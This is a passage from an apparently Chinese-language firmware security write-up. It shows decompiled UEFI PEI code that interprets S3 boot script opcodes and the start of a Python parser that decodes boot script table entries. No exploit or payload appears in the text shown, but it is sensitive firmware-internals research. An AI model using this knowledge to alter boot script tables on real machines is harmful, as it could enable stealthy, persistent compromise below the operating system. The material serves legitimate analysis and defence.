class="number">4</span>:</span><br><span class="line"></span><br><span class="line">LABEL_28:</span><br><span class="line">            <span class="comment">// EFI_BOOT_SCRIPT_PCI_CONFIG_WRITE_OPCODE</span></span><br><span class="line">            <span class="keyword">if</span> (!v49)</span><br><span class="line">            &#123;             </span><br><span class="line">              ParseInstruction(&amp;v32, (<span class="type">const</span> <span class="type">void</span> *)InstructionPtr, <span class="number">0x18</span>u);</span><br><span class="line">              InstructionPtr += <span class="number">24</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            v44 = BYTE1(v32) &amp; <span class="number">3</span>;</span><br><span class="line">            v17 = __PAIR__(BYTE1(v32), (<span class="type">unsigned</span> <span class="type">int</span>)v35) &amp; <span class="number">0xFFFFFFFCFFFFFFFF</span>;</span><br><span class="line">            LOBYTE(v45) = <span class="number">1</span> &lt;&lt; (BYTE1(v32) &amp; <span class="number">3</span>);</span><br><span class="line">            v40 = v35;</span><br><span class="line">            v48 = InstructionPtr;</span><br><span class="line">            <span class="keyword">if</span> ((<span class="type">unsigned</span> __int8)(BYTE1(v32) &amp; <span class="number">0xFC</span>) == <span class="number">4</span>)</span><br><span class="line">              LODWORD(v17) = <span class="number">1</span>;</span><br><span class="line">            v46 = <span class="number">0</span>;</span><br><span class="line">            v18 = v17 * (<span class="type">unsigned</span> __int8)(<span class="number">1</span> &lt;&lt; (BYTE1(v32) &amp; <span class="number">3</span>));</span><br><span class="line">            InstructionPtr += v18;</span><br><span class="line">            <span class="keyword">if</span> (!v35)</span><br><span class="line">              <span class="keyword">goto</span> LABEL_41;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">          <span class="keyword">case</span> <span class="number">12</span>:</span><br><span class="line"></span><br><span class="line">            <span class="comment">// EFI_BOOT_SCRIPT_PCI_CONFIG2_READ_WRITE_OPCODE</span></span><br><span class="line">            ParseInstruction(&amp;v32, (<span class="type">const</span> <span class="type">void</span> *)InstructionPtr, <span class="number">0x28</span>u);</span><br><span class="line">            InstructionPtr += <span class="number">40</span>;</span><br><span class="line">            <span class="keyword">if</span> (v37)</span><br><span class="line">            &#123;</span><br><span class="line">              pPciCfg_ = sub_FFBB557D(ppPeiServices, v37);</span><br><span class="line">              pPciCfg = pPciCfg_;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">            &#123;</span><br><span class="line">              pPciCfg_ = pPciCfg;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (!pPciCfg_)</span><br><span class="line">              <span class="keyword">goto</span> LABEL_97;</span><br><span class="line">            v49 = <span class="number">1</span>;</span><br><span class="line">            <span class="keyword">goto</span> LABEL_50;</span><br><span class="line"></span><br><span class="line">          <span class="keyword">case</span> <span class="number">5</span>:</span><br><span class="line"></span><br><span class="line">            <span class="comment">// EFI_BOOT_SCRIPT_PCI_CONFIG_READ_WRITE_OPCODE</span></span><br><span class="line">            pPciCfg_ = pPciCfg;</span><br><span class="line">LABEL_50:</span><br><span class="line">            <span class="keyword">if</span> (!v49)</span><br><span class="line">            &#123;             </span><br><span class="line">              ParseInstruction(&amp;v32, (<span class="type">const</span> <span class="type">void</span> *)InstructionPtr, <span class="number">0x20</span>u);</span><br><span class="line">              InstructionPtr += <span class="number">32</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            v23 = BYTE1(v32) &amp; <span class="number">3</span>;</span><br><span class="line">            pPciCfg_-&gt;Read(ppPeiServices, pPciCfg_, BYTE1(v32) &amp; <span class="number">3</span>, v34, HIDWORD(v34), &amp;v42);</span><br><span class="line">            v42 = v35 | v42 &amp; v36;</span><br><span class="line">            pPciCfg_-&gt;Write(ppPeiServices, pPciCfg_, v23, v34, HIDWORD(v34), &amp;v42);</span><br><span class="line">            <span class="keyword">if</span> (!v49)</span><br><span class="line">              <span class="keyword">continue</span>;</span><br><span class="line">            pPeiServices = *ppPeiServices;</span><br><span class="line">            <span class="keyword">goto</span> LABEL_43;</span><br><span class="line"></span><br><span class="line">          <span class="keyword">case</span> <span class="number">16</span>:</span><br><span class="line"></span><br><span class="line">            <span class="comment">// unknown vendor-specific opcode?</span></span><br><span class="line">            ParseInstruction(&amp;v32, (<span class="type">const</span> <span class="type">void</span> *)InstructionPtr, <span class="number">0x30</span>u);</span><br><span class="line">            InstructionPtr += <span class="number">48</span>;</span><br><span class="line">            <span class="keyword">if</span> (v39)</span><br><span class="line">              pPciCfg = (EFI_PEI_PCI_CFG_PPI *)sub_FFBB557D(ppPeiServices, v39);</span><br><span class="line">            <span class="keyword">if</span> (!pPciCfg)</span><br><span class="line">              <span class="keyword">goto</span> LABEL_97;</span><br><span class="line">            v49 = <span class="number">1</span>;</span><br><span class="line">            <span class="keyword">goto</span> LABEL_58;</span><br><span class="line"></span><br><span class="line">          <span class="keyword">case</span> <span class="number">15</span>:</span><br><span class="line"></span><br><span class="line">LABEL_58:</span><br><span class="line">            <span class="comment">// unknown vendor-specific opcode?</span></span><br><span class="line">            <span class="keyword">if</span> (!v49)</span><br><span class="line">            &#123;             </span><br><span class="line">              ParseInstruction(&amp;v32, (<span class="type">const</span> <span class="type">void</span> *)InstructionPtr, <span class="number">0x28</span>u);</span><br><span class="line">              InstructionPtr += <span class="number">40</span>;</span><br><span class="line">              v49 = <span class="number">1</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            LODWORD(v24) = sub_FFBB5DE3(v37, v38, <span class="number">10</span>, <span class="number">0</span>);</span><br><span class="line">            v41 = v24 + <span class="number">1</span>;</span><br><span class="line">            <span class="keyword">goto</span> LABEL_61;</span><br><span class="line"></span><br><span class="line">          <span class="keyword">case</span> <span class="number">6</span>:</span><br><span class="line"></span><br><span class="line">            <span class="comment">// EFI_BOOT_SCRIPT_SMBUS_EXECUTE_OPCODE</span></span><br><span class="line">            ParseInstruction(&amp;v32, (<span class="type">const</span> <span class="type">void</span> *)InstructionPtr, <span class="number">0x17</span>u);</span><br><span class="line">            v26 = InstructionPtr + <span class="number">23</span>;</span><br><span class="line">            InstructionPtr += *(_DWORD *)((<span class="type">char</span> *)&amp;v34 + <span class="number">7</span>) + <span class="number">23</span>;</span><br><span class="line">            pSmbus2-&gt;Execute(</span><br><span class="line">              pSmbus2, *(<span class="type">unsigned</span> <span class="type">int</span> *)((<span class="type">char</span> *)&amp;v32 + <span class="number">2</span>), v33,</span><br><span class="line">              *(_DWORD *)((<span class="type">char</span> *)&amp;v34 + <span class="number">2</span>), *(_DWORD *)((<span class="type">char</span> *)&amp;v34 + <span class="number">6</span>),</span><br><span class="line">              (<span class="type">char</span> *)&amp;v34 + <span class="number">7</span>, v26</span><br><span class="line">            );</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line">          <span class="keyword">case</span> <span class="number">7</span>:</span><br><span class="line"></span><br><span class="line">            <span class="comment">// EFI_BOOT_SCRIPT_STALL_OPCODE</span></span><br><span class="line">            ParseInstruction(&amp;v32, (<span class="type">const</span> <span class="type">void</span> *)InstructionPtr, <span class="number">0x10</span>u);</span><br><span class="line">            InstructionPtr += <span class="number">16</span>;</span><br><span class="line">            pStall-&gt;Stall(ppPeiServices, pStall, v34);</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line">          <span class="keyword">case</span> <span class="number">8</span>:</span><br><span class="line"></span><br><span class="line">            <span class="comment">// EFI_BOOT_SCRIPT_DISPATCH_OPCODE</span></span><br><span class="line">            ParseInstruction(&amp;v32, (<span class="type">const</span> <span class="type">void</span> *)InstructionPtr, <span class="number">0x10</span>u);</span><br><span class="line">            InstructionPtr += <span class="number">16</span>;</span><br><span class="line">            <span class="keyword">goto</span> LABEL_73;</span><br><span class="line"></span><br><span class="line">          <span class="keyword">case</span> <span class="number">9</span>:</span><br><span class="line"></span><br><span class="line">            <span class="comment">// EFI_BOOT_SCRIPT_MEM_POLL_OPCODE</span></span><br><span class="line">            ParseInstruction(&amp;v32, (<span class="type">const</span> <span class="type">void</span> *)InstructionPtr, <span class="number">0x18</span>u);</span><br><span class="line">            InstructionPtr += <span class="number">24</span>;</span><br><span class="line">LABEL_73:</span><br><span class="line">            ((<span class="type">void</span> (__cdecl *)(_DWORD, PVOID *))v34)(<span class="number">0</span>, ppPeiServices);</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line">          <span class="keyword">case</span> <span class="number">10</span>:</span><br><span class="line"></span><br><span class="line">            <span class="comment">// EFI_BOOT_SCRIPT_INFORMATION_OPCODE</span></span><br><span class="line">            InstructionPtr += <span class="number">16</span>;</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line">          <span class="keyword">default</span>:</span><br><span class="line"></span><br><span class="line">            <span class="keyword">goto</span> LABEL_97;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span> (<span class="number">1</span>)</span><br><span class="line">        &#123;</span><br><span class="line">          pPciCfg-&gt;Write(ppPeiServices, pPciCfg, v44, v34, HIDWORD(v34), v48);</span><br><span class="line"></span><br><span class="line">          <span class="keyword">if</span> (!HIDWORD(v17))</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">          <span class="keyword">if</span> (HIDWORD(v17) == <span class="number">4</span>)</span><br><span class="line">          &#123;</span><br><span class="line">            v48 += v18;</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="keyword">else</span></span><br><span class="line">          &#123;</span><br><span class="line">            <span class="keyword">if</span> (HIDWORD(v17) == <span class="number">8</span>)</span><br><span class="line">              <span class="keyword">goto</span> LABEL_39;</span><br><span class="line">          &#125;</span><br><span class="line"></span><br><span class="line">LABEL_40:</span><br><span class="line">          ++v46;</span><br><span class="line"></span><br><span class="line">          <span class="keyword">if</span> (v46 &gt;= v40)</span><br><span class="line">          &#123;</span><br><span class="line">LABEL_41:</span><br><span class="line">            <span class="keyword">if</span> (v49)</span><br><span class="line">            &#123;</span><br><span class="line">              pPeiServices = *ppPeiServices;</span><br><span class="line">              <span class="keyword">goto</span> LABEL_43;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">goto</span> LABEL_7;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        v48 += v18;</span><br><span class="line"></span><br><span class="line">LABEL_39:</span><br><span class="line"></span><br><span class="line">        LODWORD(v19) = sub_FFBB5560(v34, HIDWORD(v34), v45);</span><br><span class="line">        v34 = v19;</span><br><span class="line">        <span class="keyword">goto</span> LABEL_40;</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (!v49)</span><br><span class="line">      &#123;</span><br><span class="line">        ParseInstruction(&amp;v32, (<span class="type">const</span> <span class="type">void</span> *)InstructionPtr, <span class="number">0x18</span>u);</span><br><span class="line">        InstructionPtr += <span class="number">24</span>;</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">LABEL_78:</span><br><span class="line"></span><br><span class="line">      v27 = BYTE1(v32) &amp; <span class="number">3</span>;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">do</span></span><br><span class="line">      &#123;</span><br><span class="line">        pCpuIo-&gt;IoRead8(ppPeiServices, pCpuIo, v27, HIWORD(v32), <span class="number">0</span>, <span class="number">1</span>, &amp;v42);</span><br><span class="line">        v42 &amp;= v34;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (v49)</span><br><span class="line">        &#123;</span><br><span class="line">          pStall-&gt;Stall(ppPeiServices, pStall, <span class="number">1</span>);</span><br><span class="line">          v25 = __CFADD__((_DWORD)v41, <span class="number">-1</span>);</span><br><span class="line">          LODWORD(v41) = v41 - <span class="number">1</span>;</span><br><span class="line">          HIDWORD(v41) = v25 + HIDWORD(v41) - <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">          <span class="keyword">if</span> (!v41)</span><br><span class="line">            v42 = v35;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">while</span> (v42 != v35);</span><br><span class="line"></span><br><span class="line">LABEL_95:</span><br><span class="line"></span><br><span class="line">      v49 = <span class="number">0</span>;</span><br><span class="line">      <span class="keyword">continue</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    v28 = Opcode - <span class="number">0x81</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!v28)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> (!v49)</span><br><span class="line">      &#123;</span><br><span class="line">        ParseInstruction(&amp;v32, (<span class="type">const</span> <span class="type">void</span> *)InstructionPtr, <span class="number">0x20</span>u);</span><br><span class="line">        InstructionPtr += <span class="number">32</span>;</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">LABEL_90:</span><br><span class="line"></span><br><span class="line">      v31 = BYTE1(v32) &amp; <span class="number">3</span>;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">do</span></span><br><span class="line">      &#123;</span><br><span class="line">        pCpuIo-&gt;Mem(ppPeiServices, pCpuIo, v31, v34, HIDWORD(v34), <span class="number">1</span>, &amp;v42);</span><br><span class="line">        v42 &amp;= v35;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (v49)</span><br><span class="line">        &#123;</span><br><span class="line">          pStall-&gt;Stall(ppPeiServices, pStall, <span class="number">1</span>);</span><br><span class="line">          v25 = __CFADD__((_DWORD)v41, <span class="number">-1</span>);</span><br><span class="line">          LODWORD(v41) = v41 - <span class="number">1</span>;</span><br><span class="line">          HIDWORD(v41) = v25 + HIDWORD(v41) - <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">          <span class="keyword">if</span> (!v41)</span><br><span class="line">            v42 = v36;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">while</span> (v42 != v36);</span><br><span class="line"></span><br><span class="line">      <span class="keyword">goto</span> LABEL_95;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    v29 = v28 - <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (v29)</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">LABEL_61:</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!v49)</span><br><span class="line">    &#123;</span><br><span class="line">      ParseInstruction(&amp;v32, (<span class="type">const</span> <span class="type">void</span> *)InstructionPtr, <span class="number">0x20</span>u);</span><br><span class="line">      InstructionPtr += <span class="number">32</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    v44 = BYTE1(v32) &amp; <span class="number">3</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">    &#123;</span><br><span class="line">      pPciCfg-&gt;Read(ppPeiServices, pPciCfg, v44, v34, HIDWORD(v34), &amp;v42);</span><br><span class="line">      v42 &amp;= v35;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (v49)</span><br><span class="line">      &#123;</span><br><span class="line">        pStall-&gt;Stall(ppPeiServices, pStall, <span class="number">1</span>);</span><br><span class="line">        v25 = __CFADD__((_DWORD)v41, <span class="number">-1</span>);</span><br><span class="line">        LODWORD(v41) = v41 - <span class="number">1</span>;</span><br><span class="line">        HIDWORD(v41) = v25 + HIDWORD(v41) - <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!v41)</span><br><span class="line">          v42 = v36;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> (v42 != v36);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (v49)</span><br><span class="line">    &#123;</span><br><span class="line">      pPeiServices = *ppPeiServices;</span><br><span class="line"></span><br><span class="line">LABEL_43:</span><br><span class="line"></span><br><span class="line">      pPciCfg__ = (EFI_PEI_PCI_CFG_PPI *)*((_DWORD *)pPeiServices + <span class="number">25</span>);</span><br><span class="line">      v49 = <span class="number">0</span>;</span><br><span class="line">      pPciCfg = pPciCfg__;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  v30 = v29 - <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (!v30)</span><br><span class="line">  &#123;</span><br><span class="line">    InstructionPtr += *(_DWORD *)(InstructionPtr + <span class="number">4</span>) + <span class="number">8</span>;</span><br><span class="line">    <span class="keyword">goto</span> LABEL_7;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (v30 == <span class="number">0x7C</span>)</span><br><span class="line">  &#123;</span><br><span class="line">    result = <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line"></span><br><span class="line">LABEL_97:</span><br><span class="line"></span><br><span class="line">    result = <span class="number">0x80000003</span>u;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;   </span><br><span class="line"></span><br></pre></td></tr></table></figure>


<p>现在我们可以从上面的代码中恢复引导脚本表格式的其余部分，并编写一个能够处理<code>EFI_BOOT_SCRIPT_MEM_WRITE_OPCODE</code>，<code>EFI_BOOT_SCRIPT_PCI_CONFIG_WRITE_OPCODE</code>，<code>EFI_BOOT_SCRIPT_IO_WRITE_OPCODE </code>和<code>EFI_BOOT_SCRIPT_DISPATCH_OPCODE </code>的基本解析器，这足以解码最有趣的boot script表项了：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br></pre></td><td class="code"><pre><span class="line">from struct import pack, unpack</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def _at(data, off, size, fmt): return unpack(fmt, data[off : off + size])[0]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># helper functions for accessing binary structures data</span><br><span class="line">def byte_at(data, off = 0): return _at(data, off, 1, &#x27;B&#x27;)</span><br><span class="line">def word_at(data, off = 0): return _at(data, off, 2, &#x27;H&#x27;)</span><br><span class="line">def dword_at(data, off = 0): return _at(data, off, 4, &#x27;I&#x27;)</span><br><span class="line">def qword_at(data, off = 0): return _at(data, off, 8, &#x27;Q&#x27;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">class BootScriptParser(object):</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    def __init__(self, quiet = False):</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        self.quiet = quiet</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    def value_at(self, data, off, width):</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        # read boot script value of given type</span><br><span class="line">        if width == self.EfiBootScriptWidthUint8: return byte_at(data, off)</span><br><span class="line">        elif width == self.EfiBootScriptWidthUint16: return word_at(data, off)</span><br><span class="line">        elif width == self.EfiBootScriptWidthUint32: return dword_at(data, off)</span><br><span class="line">        elif width == self.EfiBootScriptWidthUint64: return qword_at(data, off)</span><br><span class="line">        else: raise Exception(&#x27;Invalid width 0x%x&#x27; % width)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    def width_size(self, width):</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        # get actual size of the boot script value by size id</span><br><span class="line">        if width == self.EfiBootScriptWidthUint8: return 1</span><br><span class="line">        elif width == self.EfiBootScriptWidthUint16: return 2</span><br><span class="line">        elif width == self.EfiBootScriptWidthUint32: return 4</span><br><span class="line">        elif width == self.EfiBootScriptWidthUint64: return 8</span><br><span class="line">        else: raise Exception(&#x27;Invalid width 0x%x&#x27; % width)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    def log(self, data):</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        if not self.quiet: print data</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    def process_mem_write(self, width, addr, count, val):</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        self.log((&#x27;Width: %s, Addr: 0x%.16x, Count: %d\n&#x27; + \</span><br><span class="line">                  &#x27;Value: %s\n&#x27;) % \</span><br><span class="line">                 (self.boot_script_width[width], addr, count, \</span><br><span class="line">                  &#x27;, &#x27;.join(map(lambda v: hex(v), val))))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    def process_pci_config_write(self, width, bus, dev, fun, off, count, val):</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        self.log((&#x27;Width: %s, Count: %d\n&#x27; + \</span><br><span class="line">                  &#x27;Bus: 0x%.2x, Device: 0x%.2x, Function: 0x%.2x, Offset: 0x%.2x\n&#x27; + \</span><br><span class="line">                  &#x27;Value: %s\n&#x27;) % \</span><br><span class="line">                 (self.boot_script_width[width], count, bus, dev, fun, off, \</span><br><span class="line">                  &#x27;, &#x27;.join(map(lambda v: hex(v), val))))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    def process_io_write(self, width, port, count, val):</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        self.log((&#x27;Width: %s, Port: 0x%.4x, Count: %d\n&#x27; + \</span><br><span class="line">                  &#x27;Value: %s\n&#x27;) % \</span><br><span class="line">                 (self.boot_script_width[width], port, count, \</span><br><span class="line">                  &#x27;, &#x27;.join(map(lambda v: hex(v), val))))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    def process_dispatch(self, addr):</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        self.log(&#x27;Call addr: 0x%.16x&#x27; % (addr) + &#x27;\n&#x27;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    def read_values(self, data, width, count):</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        values = []</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        for i in range(0, count):</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">            # read single value of given width</span><br><span class="line">            values.append(self.value_at(data, i * self.width_size(width), width))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        return values</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    def parse(self, data, boot_script_addr = 0L):</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        ptr = 0</span><br><span class="line">        while data:</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">            # read 引导脚本表 entry header</span><br><span class="line">            num, size, op = unpack(&#x27;IIB&#x27;, data[:9])      </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">            # check for the end of the table</span><br><span class="line">            if op == 0xff:</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">                self.log(&#x27;# End of the boot script at offset 0x%x&#x27; % ptr)</span><br><span class="line">                break</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">            elif op &gt;= len(self.boot_script_ops):</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">                raise Exception(&#x27;Invalid op 0x%x&#x27; % op)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">            self.log(&#x27;#%d len=%d %s&#x27; % (num, size, self.boot_script_ops[op]))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">            # process known opcodes</span><br><span class="line">            if op == self.EFI_BOOT_SCRIPT_MEM_WRITE_OPCODE:</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">                # get value information</span><br><span class="line">                width, count = byte_at(data, 9), qword_at(data, 24)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">                # get write adderss</span><br><span class="line">                addr = qword_at(data, 16)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">                # get values list</span><br><span class="line">                values = self.read_values(data[32:], width, count)</span><br><span class="line">               </span><br><span class="line">                self.process_mem_write(width, addr, count, values)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">            elif op == self.EFI_BOOT_SCRIPT_PCI_CONFIG_WRITE_OPCODE:</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">                # get value information</span><br><span class="line">                width, count = byte_at(data, 9), qword_at(data, 24)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">                # get write adderss</span><br><span class="line">                addr = qword_at(data, 16)               </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">                # get PCI device address</span><br><span 